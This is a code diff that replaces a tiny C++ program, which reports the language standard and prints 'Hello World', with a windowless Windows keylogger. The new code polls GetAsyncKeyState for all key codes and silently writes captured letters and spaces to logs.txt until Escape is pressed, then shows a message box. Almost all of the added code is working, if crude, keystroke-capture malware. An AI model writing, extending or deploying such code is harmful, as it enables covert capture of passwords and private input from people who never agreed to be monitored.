@@ -1,23 +1,38 @@
-#include <iostream>
-
-int main() {
-    #if __cplusplus == 199711L
-        std::cout << "C++98/03\n";
-    #elif __cplusplus == 201103L
-        std::cout << "C++11\n";
-    #elif __cplusplus == 201402L
-        std::cout << "C++14\n";
-    #elif __cplusplus == 201703L
-        std::cout << "C++17\n";
-    #elif __cplusplus == 202002L
-        std::cout << "C++20\n";
-    #elif __cplusplus > 202002L
-        std::cout << "C++23 ili noviji\n";
-    #else
-        std::cout << "Nepoznat standard\n";
-    #endif
+#include <Windows.h>
+#include <winuser.h>
+#include <fstream>
+#include <cctype>
 
 
-    std::cout << "Hello World";
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR args, int nCmdShow) {
+    
+    std::ofstream log("logs.txt");
 
+    //clears ghost input in logs
+    for (int i{}; i < 256; ++i)
+        GetAsyncKeyState(i);
+
+
+    //input logger with memory leak
+    while (!GetAsyncKeyState(VK_ESCAPE) && true) {
+
+        for (int i{}; i < 256; ++i) {
+            if (GetAsyncKeyState(i) & 0b1) {
+                if (std::isupper(i))
+                    log << (char)i;
+                else if (GetAsyncKeyState(VK_SPACE))
+                    log << " ";
+            }
+                
+        }
+        
+    }
+     
+
+
+
+    MessageBoxW(0, L"Key Broadcast - OFF", L"Log", MB_OK);
+    log.close();
+
+    return 0;
 }
